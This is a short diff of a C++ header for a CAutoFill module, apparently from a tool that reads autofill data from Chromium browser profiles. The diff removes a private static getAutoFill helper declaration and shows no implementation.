@@ -12,8 +12,6 @@
 class CAutoFill : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
-private:
-    static std::list<AutoFill> getAutoFill(const fs::path &db_path);
 };
 
 
